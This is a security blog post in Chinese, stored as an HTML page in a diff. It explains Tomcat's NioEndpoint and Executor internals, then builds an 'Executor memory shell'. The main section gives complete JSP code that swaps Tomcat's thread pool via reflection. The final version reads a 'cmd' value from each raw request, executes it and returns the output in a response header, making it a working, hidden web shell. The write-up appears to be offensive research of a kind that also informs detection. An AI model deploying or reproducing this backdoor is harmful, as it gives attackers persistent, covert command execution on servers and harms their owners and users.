@@ -1,0 +1,568 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Executor Memory Shell | ch1e的自留地</title>
+<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Executor Memory Shell | ch1e的自留地 - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前置知识
+通过对之前Tomcat的整体架构的学习，可以知道一个Tomcat中是有一个Server，一个Server下有好几个Service，一个Service有多个Connector和一个Container，Connector是负责处理连接..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://ch0x01e.github.io">
+  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
+  </a>
+  <h1 class="site-title">
+    ch1e的自留地
+  </h1>
+  <p class="site-description">
+    Manners maketh man
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+      
+        <a href="https://ch1e.cn/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Executor Memory Shell
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-10-16
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220928162402322.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前置知识">前置知识</h1>
+<p>通过对之前Tomcat的整体架构的学习，可以知道一个Tomcat中是有一个Server，一个Server下有好几个Service，一个Service有多个Connector和一个Container，Connector是负责处理连接相关的事情，Container用于封装和管理Servlet和处理Request请求。</p>
+<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220928162402322.png" alt="image-20220928162402322" loading="lazy"></figure>
+<h2 id="connector架构分析">Connector架构分析</h2>
+<p>在Connector和Container的关系中说到，Connector是接收请求并且把他封装成Request和Response，然后交给Container处理，Container处理完以后返回给客户端，具体过程如下</p>
+<figure data-type="image" tabindex="2"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220928163453107.png" alt="image-20220928163453107" loading="lazy"></figure>
+<p>请求来到Connector中，用ProtocolHandler来处理请求，不同的ProtocolHandler代表不同的连接类型。Http11Protocol使用的是普通Socket来连接的，Http11NioProtocol使用的是NioSocket来连接的。</p>
+<p>ProtocolHandler又包含三部分，分别是Endpoint，Processor和adapeter。Endpoint用来处理底层Socket的网络连接，Processor把Endpoint接收到的Socket封装成Request，Adapter把Request交给Container进行具体的处理。<img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007204256333.png" alt="image-20221007204256333" loading="lazy"></p>
+<h2 id="nioendpoint">NioEndpoint</h2>
+<p>Endpoint五大组件：</p>
+<ul>
+<li>LimitLatch：连接控制器，负责控制最大的连接数</li>
+<li>Acceptor：负责接收新的连接，然后返回一个Channel对象给Poller</li>
+<li>Poller：可以将其看成是NIO中Selector，负责监控Channel的状态</li>
+<li>SocketProcessor：可以看成是一个被封装的任务类</li>
+<li>Executor：Tomcat自己扩展的线程池，用来执行任务类</li>
+</ul>
+<p>直接来看<code>org.apache.tomcat.util.net.NioEndpoint.Poller</code>,直接来看他的run方法，通过调用events方法，来判断是否还有Pollerevent事件，如果有就将其取出，然后把里面的Channel取出来注册到该Selector中，然后不断轮询所有注册过的Channel查看是否有事件发生。当有事件发生时，则调用SocketProcessor交给Executor执行。</p>
+<pre><code class="language-java">public class Poller implements Runnable {
+    .....
+    public void run() {
+            // Loop until destroy() is called
+            while (true) {
+
+                boolean hasEvents = false;
+
+                try {
+                    if (!close) {
+                        hasEvents = events();
+                        if (wakeupCounter.getAndSet(-1) &gt; 0) {
+                            // If we are here, means we have other stuff to do
+                            // Do a non blocking select
+                            keyCount = selector.selectNow();
+                        } else {
+                            keyCount = selector.select(selectorTimeout);
+                        }
+                        wakeupCounter.set(0);
+                    }
+                    if (close) {
+                        events();
+                        timeout(0, false);
+                        try {
+                            selector.close();
+                        } catch (IOException ioe) {
+                            log.error(sm.getString(&quot;endpoint.nio.selectorCloseFail&quot;), ioe);
+                        }
+                        break;
+                    }
+                    // Either we timed out or we woke up, process events first
+                    if (keyCount == 0) {
+                        hasEvents = (hasEvents | events());
+                    }
+                } catch (Throwable x) {
+                    ExceptionUtils.handleThrowable(x);
+                    log.error(sm.getString(&quot;endpoint.nio.selectorLoopError&quot;), x);
+                    continue;
+                }
+
+                Iterator&lt;SelectionKey&gt; iterator =
+                    keyCount &gt; 0 ? selector.selectedKeys().iterator() : null;
+                // Walk through the collection of ready keys and dispatch
+                // any active event.
+                while (iterator != null &amp;&amp; iterator.hasNext()) {
+                    SelectionKey sk = iterator.next();
+                    iterator.remove();
+                    NioSocketWrapper socketWrapper = (NioSocketWrapper) sk.attachment();
+                    // Attachment may be null if another thread has called
+                    // cancelledKey()
+                    if (socketWrapper != null) {
+                        processKey(sk, socketWrapper);
+                    }
+                }
+
+                // Process timeouts
+                timeout(keyCount,hasEvents);
+            }
+
+            getStopLatch().countDown();
+        }
+    .....
+}
+</code></pre>
+<p>然后来看processKey方法，processKey()这个方法主要通过调用processSocket()方法创建一个SocketProcessor，然后丢到Tomcat线程池中去执行。每个Endpoint都有自己的SocketProcessor实现，从Endpoint的属性中可以看到，这个Processor也有缓存机制。 总结一下Poller所做的事：遍历PollerEvents队列，将每个事件中的通道感兴趣的事件注册到Selector，当事件就绪时，创建一个SocketProcessor或者从缓存中取出一个SocketProcessor，然后放到线程池执行或者直接执行它的run方法执行。</p>
+<figure data-type="image" tabindex="3"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007210001412.png" alt="image-20221007210001412" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007210033816.png" alt="image-20221007210033816" loading="lazy"></figure>
+<h2 id="executor">Executor</h2>
+<pre><code class="language-java">public interface Executor {
+    void execute(Runnable command);
+}
+</code></pre>
+<p>在Tomcat中Executor由Service维护，因此同一个Service中的组件可以共享一个线程池。如果没有定义任何线程池，相关组件( 如Endpoint)会自动创建线程池，此时，线程池不再共享。</p>
+<figure data-type="image" tabindex="5"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007210513497.png" alt="image-20221007210513497" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007210618930.png" alt="image-20221007210618930" loading="lazy"></figure>
+<p>这里是直接实例化EndPoint自己启动的TreadPoolExecutor类，所以我们恶意的Executor只需要继承这个类即可，来看看execute方法</p>
+<pre><code class="language-java">@Override
+public void execute(Runnable command) {
+    execute(command,0,TimeUnit.MILLISECONDS);
+}
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007210941857.png" alt="image-20221007210941857" loading="lazy"></figure>
+<p>所以我们只需要新建一个类继承自这个TreadPoolExecutor类，然后把恶意的逻辑重写到execute方法即可。</p>
+<p>此外，他还有一个setExecutor方法，可以直接设置Executor，所以我们只需要获取到NioEndpoint然后调用setExecutor方法把恶意类设置进去即可。</p>
+<pre><code class="language-java">public void setExecutor(Executor executor) {
+    this.executor = executor;
+    this.internalExecutor = (executor == null);
+}
+</code></pre>
+<h1 id="正文">正文</h1>
+<p>上文说到，我们只需要构造一个继承自TreadPoolExecutor类的恶意类，然后重写恶意逻辑到execute方法。所以最简单的内存马就可以写好了，主要的问题就是获取NioEndpoint对象。</p>
+<pre><code class="language-jsp">&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.RejectedExecutionHandler&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+
+&lt;%!
+  public Object getField(Object object, String fieldName) {
+    Field declaredField;
+    Class clazz = object.getClass();
+    while (clazz != Object.class) {
+      try {
+
+        declaredField = clazz.getDeclaredField(fieldName);
+        declaredField.setAccessible(true);
+        return declaredField.get(object);
+      } catch (NoSuchFieldException | IllegalAccessException e) {
+      }
+      clazz = clazz.getSuperclass();
+    }
+    return null;
+  }
+
+
+  public Object getStandardService() {
+    Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);
+    for (Thread thread : threads) {
+      if (thread == null) {
+        continue;
+      }
+      if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) {
+        Object target = this.getField(thread, &quot;target&quot;);
+        Object jioEndPoint = null;
+        try {
+          jioEndPoint = getField(target, &quot;endpoint&quot;);
+          return jioEndPoint;
+        } catch (Exception e) {
+        }
+      }
+    }
+    return new Object();
+  }
+
+  public class threadexcutor extends ThreadPoolExecutor {
+
+    public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+      super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
+    }
+
+
+    @Override
+    public void execute(Runnable command) {
+      try {
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+      } catch (IOException e) {
+        throw new RuntimeException(e);
+      }
+
+      this.execute(command, 0L, TimeUnit.MILLISECONDS);
+    }
+
+  }
+%&gt;
+&lt;%
+  NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
+  ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;);
+  threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+  nioEndpoint.setExecutor(exe);
+%&gt;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007211749360.png" alt="image-20221007211749360" loading="lazy"></figure>
+<p>那么这样的话我们只能执行固定的命令，如果说需要交互的话，还需要我们进一步的处理。我们可以通过把命令放到请求头里来实现交互。这时候就需要我们去获取到Response和Request，在@<a href="https://xz.aliyun.com/u/40487"><strong>bluE0</strong></a>中说到，NioEndpoint中的nioChannels的appReadBufHandler其中的Buffer存放着我们所需要的request，这里直接引用@<a href="https://xz.aliyun.com/u/40487"><strong>bluE0</strong></a>师傅的图。所以我们只需要从NioEndpoint的nioChannels的appReadBufHandler获取命令即可</p>
+<figure data-type="image" tabindex="9"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007212743254.png" alt="image-20221007212743254" loading="lazy"></figure>
+<p>除了交互式，我们还需要让他回显，具体也还是看@<a href="https://xz.aliyun.com/u/40487"><strong>bluE0</strong></a>师傅在先知发的文章，将命令执行的结果提前放入Tomcat的response，通过Acceptor的endpoint属性的handler属性的global属性的processors属性获取到一个RequestInfo的ArrayList，然后遍历，获取RequestInfo，从RequestInfo的req属性的response属性获取response对象，然后调用addHeader方法来实现回显</p>
+<p>最后的jsp的内存马如下</p>
+<pre><code class="language-java">&lt;%@ page import=&quot;org.apache.tomcat.util.net.NioEndpoint&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.tomcat.util.threads.ThreadPoolExecutor&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.TimeUnit&quot; %&gt;
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.BlockingQueue&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.ThreadFactory&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.ByteBuffer&quot; %&gt;
+&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.coyote.RequestInfo&quot; %&gt;
+&lt;%@ page import=&quot;org.apache.coyote.Response&quot; %&gt;
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
+&lt;%@ page import=&quot;java.nio.charset.StandardCharsets&quot; %&gt;
+&lt;%@ page import=&quot;java.util.concurrent.RejectedExecutionHandler&quot; %&gt;
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+
+
+&lt;%!
+  public Object getField(Object object, String fieldName) {
+    Field declaredField;
+    Class clazz = object.getClass();
+    while (clazz != Object.class) {
+      try {
+
+        declaredField = clazz.getDeclaredField(fieldName);
+        declaredField.setAccessible(true);
+        return declaredField.get(object);
+      } catch (NoSuchFieldException | IllegalAccessException e) {
+      }
+      clazz = clazz.getSuperclass();
+    }
+    return null;
+  }
+
+
+  public Object getStandardService() {
+    Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);
+    for (Thread thread : threads) {
+      if (thread == null) {
+        continue;
+      }
+      if ((thread.getName().contains(&quot;Acceptor&quot;)) &amp;&amp; (thread.getName().contains(&quot;http&quot;))) {
+        Object target = this.getField(thread, &quot;target&quot;);
+        Object jioEndPoint = null;
+        try {
+          jioEndPoint = getField(target, &quot;this$0&quot;);
+        } catch (Exception e) {
+        }
+        if (jioEndPoint == null) {
+          try {
+            jioEndPoint = getField(target, &quot;endpoint&quot;);
+            return jioEndPoint;
+          } catch (Exception e) {
+            new Object();
+          }
+        } else {
+          return jioEndPoint;
+        }
+      }
+
+    }
+    return new Object();
+  }
+
+  public class threadexcutor extends ThreadPoolExecutor {
+
+    public threadexcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
+      super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
+    }
+
+    public String getRequest() {
+      try {
+        Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;));
+
+        for (Thread thread : threads) {
+          if (thread != null) {
+            String threadName = thread.getName();
+            if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) {
+              Object target = getField(thread, &quot;target&quot;);
+              if (target instanceof Runnable) {
+                try {
+
+
+                  //Object[] objects = (Object[]) getField(getField(getField(target, &quot;this$0&quot;), &quot;nioChannels&quot;), &quot;stack&quot;);
+
+                  Object[] objects = (Object[]) getField(getField(getField(target, &quot;endpoint&quot;), &quot;nioChannels&quot;), &quot;stack&quot;);
+                  ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], &quot;appReadBufHandler&quot;), &quot;byteBuffer&quot;);
+                  String a = new String(heapByteBuffer.array(), &quot;UTF-8&quot;);
+
+                  if (a.indexOf(&quot;cmd&quot;) &gt; -1) {
+                    System.out.println(a.indexOf(&quot;cmd&quot;));
+                    System.out.println(a.indexOf(&quot;\r&quot;, a.indexOf(&quot;cmd&quot;)) - 1);
+                    String b = a.substring(a.indexOf(&quot;cmd&quot;) + &quot;cmd&quot;.length() + 1, a.indexOf(&quot;\r&quot;, a.indexOf(&quot;cmd&quot;)) - 1);
+                    return b;
+                  }
+
+                } catch (Exception var11) {
+                  System.out.println(var11);
+                  continue;
+                }
+
+
+              }
+            }
+          }
+        }
+      } catch (Exception ignored) {
+      }
+      return new String();
+    }
+
+
+    public void getResponse(byte[] res) {
+      System.out.println(1);
+      try {
+        Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;));
+
+        for (Thread thread : threads) {
+          if (thread != null) {
+            String threadName = thread.getName();
+            if (!threadName.contains(&quot;exec&quot;) &amp;&amp; threadName.contains(&quot;Acceptor&quot;)) {
+              Object target = getField(thread, &quot;target&quot;);
+              if (target instanceof Runnable) {
+                try {
+                  ArrayList objects = (ArrayList) getField(getField(getField(getField(target, &quot;endpoint&quot;), &quot;handler&quot;), &quot;global&quot;), &quot;processors&quot;);
+                  for (Object tmp_object : objects) {
+                    RequestInfo request = (RequestInfo) tmp_object;
+                    Response response = (Response) getField(getField(request, &quot;req&quot;), &quot;response&quot;);
+                    System.out.println(&quot;res:&quot;+new String(res, &quot;UTF-8&quot;));
+                    response.addHeader(&quot;Server-token&quot;, new String(res, &quot;UTF-8&quot;));
+                  }
+                } catch (Exception var11) {
+                  continue;
+                }
+
+              }
+            }
+          }
+        }
+      } catch (Exception ignored) {
+      }
+    }
+
+
+    @Override
+    public void execute(Runnable command) {
+//      System.out.println(&quot;123&quot;);
+      String cmd = getRequest();
+      System.out.println(&quot;cmd&quot;+cmd);
+      try {
+        Runtime.getRuntime().exec(cmd);
+      } catch (IOException e) {
+        throw new RuntimeException(e);
+      }
+
+      if (cmd.length() &gt; 1) {
+        try {
+          Runtime rt = Runtime.getRuntime();
+          Process process = rt.exec(cmd);
+          java.io.InputStream in = process.getInputStream();
+
+          java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
+          java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
+          String s = &quot;&quot;;
+          String tmp = &quot;&quot;;
+          while ((tmp = stdInput.readLine()) != null) {
+            s += tmp;
+          }
+          if (s != &quot;&quot;) {
+            byte[] res = s.getBytes(StandardCharsets.UTF_8);
+            getResponse(res);
+          }
+
+
+        } catch (IOException e) {
+          e.printStackTrace();
+        }
+      }
+
+
+      this.execute(command, 0L, TimeUnit.MILLISECONDS);
+    }
+
+  }
+
+%&gt;
+
+&lt;%
+  NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
+  ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;);
+  threadexcutor exe = new threadexcutor(exec.getCorePoolSize(), exec.getMaximumPoolSize(), exec.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, exec.getQueue(), exec.getThreadFactory(), exec.getRejectedExecutionHandler());
+  nioEndpoint.setExecutor(exe);
+%&gt;
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20221007221202421.png" alt="image-20221007221202421" loading="lazy"></figure>
+<h1 id="问题">问题</h1>
+<p>该内存马会存在个问题，就是需要多次请求才能执行到指定的命令，后续还会再研究，先丢着。感谢@bulE0师傅的文章给我学习的机会</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">前置知识</a>
+<ul>
+<li><a href="#connector%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90">Connector架构分析</a></li>
+<li><a href="#nioendpoint">NioEndpoint</a></li>
+<li><a href="#executor">Executor</a></li>
+</ul>
+</li>
+<li><a href="#%E6%AD%A3%E6%96%87">正文</a></li>
+<li><a href="#%E9%97%AE%E9%A2%98">问题</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://ch0x01e.github.io/post/spring-xi-lie-fan-xu-lie-hua-lian/">
+              <h3 class="post-title">
+                Spring系列反序列化链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
